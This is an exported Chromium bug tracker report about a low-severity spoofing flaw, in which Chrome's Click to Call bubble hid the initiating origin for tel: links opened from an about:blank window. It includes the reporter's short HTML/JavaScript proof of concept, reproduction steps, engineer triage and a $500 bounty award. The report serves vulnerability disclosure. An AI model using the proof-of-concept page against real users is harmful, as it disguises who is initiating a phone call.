# Security: tel: protocal spoofing

| Field | Value |
|-------|-------|
| **Issue ID** | [40056040](https://issues.chromium.org/issues/40056040) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | UI>Browser>Navigation |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | li...@gmail.com |
| **Assignee** | es...@chromium.org |
| **Created** | 2021-05-29 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36

Steps to reproduce the problem:
<html>
<head>
    <title>Chrome Url Spoofing (bypass dangerous website) vulnerability</title>
</head>
<script>
function pwn() {
    w = window.open();
    w.document.write('<p>Calling Google</p>'));
    setTimeout("w.location.replace('tel:https://google.com');",5);
}
</script>
<h1><button href="#" onclick="pwn()">CLICK TO CALL</button></h1>
</html>

Put it a domain
and make a iframe in another domain
On clicking there is no initiating origin

What is the expected behavior?
The bubble display the initiating origin

What went wrong?
The bubble will display the initiating origin if it is different from the current top level content
But  the bubble doesn't display the initiating origin if it's about blank page.

Did this work before? N/A 

Chrome version: 91.0.4472.77  Channel: stable
OS Version: 10.0
Flash Version:

## Attachments

- [screen-capture.webm](attachments/screen-capture.webm) (video/webm, 1.2 MB)
- [Screenshot 2024-04-11 232101.png](attachments/Screenshot 2024-04-11 232101.png) (image/png, 115.9 KB)
- [Screenshot 2024-04-11 232101 (1).png](attachments/Screenshot 2024-04-11 232101 (1).png) (image/png, 115.9 KB)

## Timeline

### [Deleted User] (2021-05-29)

[Empty comment from Monorail migration]

### ad...@google.com (2021-05-29)

Reproduced on 91.0.4472.77 Mac as follows.

1. Create a directory
2. Put the snippet above into a.html
3. Remove the extra ) from the line w.document.write('<p>Calling Google</p>'));
4. Create b.html in the same directory as follows
<html>
<body>
<p>Outer</p>
<iframe src="http://127.0.0.1:8605/a.html">
</body>
</html>
5. python3 -m http.server 8605 & python3 -m http.server 8604 &
6. Using Chrome synced to a Google account that also has a phone attached...
7. Visit http://localhost:8604/b.html
8. Click Click to Call

Actual behavior:
* about:blank tab opens, displaying "Calling Google", and "Make a call from" doesn't display the initiating origin.

Rating it as Low severity similar to https://crbug.com/chromium/1202485.

[Monorail components: UI>Browser>Navigation]

### ad...@google.com (2021-05-29)

[Empty comment from Monorail migration]

### li...@gmail.com (2021-05-29)

[Comment Deleted]

### li...@gmail.com (2021-05-29)

Hi it is more similar to https://crbug.com/chromium/1041749 which is medium. Please look.

### kn...@chromium.org (2021-06-01)

Hm, interesting. We correctly pipe through the initiating origin (or precursor origin if the initiating one is opaque [1]) all the way to the view where we compare it against "web_contents->GetMainFrame()->GetLastCommittedOrigin()" [2].
In this case RenderFrameHost::GetLastCommittedOrigin() returns "http://127.0.0.1:8605" on the "about:blank" tab which causes us to hide the origin as it matches the initiating origin..
Is that expected? How would we get the correct main frame origin to compare against? +estark@, any ideas?

The result is that Click to Call can be shown on "about:blank" with arbitrary content on the page, I'm not sure how much worse that is compared to regular "lookalike" origins like "go0gle.com" or similar where we'd also hide the origin (as it's shown in the Omnibox already)?

[1]: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/external_protocol/external_protocol_handler.cc;l=442;drc=8f66920aaf192a0c627a68cf9bde1fba3b22c421
[2]: https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/ui/views/sharing/sharing_dialog_view.cc;l=58;drc=df1d1f34ad63d3047c6f355c9ab5ca75ffa98a60

### kn...@chromium.org (2021-06-01)

[Comment Deleted]

### bd...@chromium.org (2021-06-07)

[Empty comment from Monorail migration]

### li...@gmail.com (2021-06-12)

[Comment Deleted]

### li...@gmail.com (2021-07-27)

[Comment Deleted]

### li...@gmail.com (2021-09-17)

[Comment Deleted]

### li...@gmail.com (2021-10-12)

[Comment Deleted]

### li...@gmail.com (2022-05-09)

[Comment Deleted]

### li...@gmail.com (2023-01-05)

[Comment Deleted]

### li...@gmail.com (2023-02-22)

friendly ping.Two year complete

### li...@gmail.com (2023-03-14)

Hi,
Any updates.

### is...@google.com (2023-03-14)

This issue was migrated from crbug.com/chromium/1214444?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1216698]
[Monorail components added to Component Tags custom field.]

### li...@gmail.com (2024-04-11)

Mam,

It is fixed. Please mark it as fixed.

### li...@gmail.com (2024-05-06)

Dear Team,

It is fixed. Please mark it as fixed.

Attaching screen 

The bug behaviour changed 

What is the expected behavior?
The bubble display the initiating origin

What went wrong?
The bubble will display the initiating origin if it is different from the current top level content
But  the bubble doesn't display the initiating origin if it's about blank page. 

Now it is showing initiating origin


### am...@chromium.org (2024-05-06)

it looks like click to call was disabled in 2023: <https://crrev.com/c/4294126>

### li...@gmail.com (2024-05-07)

Dear Team

Is this eligible for reward?

### am...@chromium.org (2024-05-13)

we will review it at an upcoming VRP panel session

### li...@gmail.com (2024-06-06)

Hi,

Any updates 

### am...@chromium.org (2024-06-10)

Hello, VRP issues are reviewed in order of severity, so we haven't quite gotten to this one yet. It will be reviewed in a future VRP Panel session, so don't worry. Thank you for your patience in the meantime.

### sp...@google.com (2024-06-28)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $500.00 for this report.

Rationale for this decision:
thank you reward for low impact security bug report, from which we were able to make a security relevant change


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-06-28)

Thank you for your efforts and reporting this issue to us!

### li...@gmail.com (2024-06-30)

Thanks for Reward
Lijo

### pe...@google.com (2024-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> thank you reward for low impact security bug report, from which we were able to make a security relevant change

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40056040)*
